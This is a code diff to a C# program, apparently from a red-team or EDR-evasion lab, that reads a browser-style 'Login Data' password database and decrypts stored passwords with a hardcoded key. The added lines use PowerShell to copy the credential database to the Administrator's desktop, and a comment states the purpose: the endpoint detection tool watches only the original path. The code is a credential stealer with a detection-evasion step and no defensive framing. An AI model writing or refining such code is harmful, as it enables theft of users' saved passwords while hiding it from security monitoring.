@@ -11,7 +11,7 @@ using Newtonsoft.Json;
 class Program
 {
     //const string SECRET = "00000000000000000000000000000000";
-    const string SECRET = "7jnNIqN714JROiTN9hLsBBq3hjo7aQCS";
+    const string SECRET = "wTZafOoDdKtwfsrkKMgY0YMpcbWegMT6";
     const int PROCESS_ALL_ACCESS = 0x1F0FFF;
     const int MEM_COMMIT = 0x1000;
     const int PAGE_READWRITE = 0x04;
@@ -170,6 +170,18 @@ class Program
     {
         string decryptedPassword = null;
         string dbPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";
+        string newDBPath = "C:\\Users\\Administrator\\Desktop\\Login Data";
+
+        // The EDR is only monitoring the original path, so we copy it to a new location
+        string cp_cmd = $"-c \"cp \'{dbPath}\' \'{newDBPath}\'\"";
+        Process cp_proc = Process.Start("powershell", cp_cmd);
+
+        if (cp_proc != null)
+        {
+            // Wait for the copy process to complete
+            cp_proc.WaitForExit();
+        }
+
         byte[] key = Encoding.UTF8.GetBytes(SECRET);
 
         using (SQLiteConnection conn = new SQLiteConnection($"Data Source={dbPath};Version=3;"))
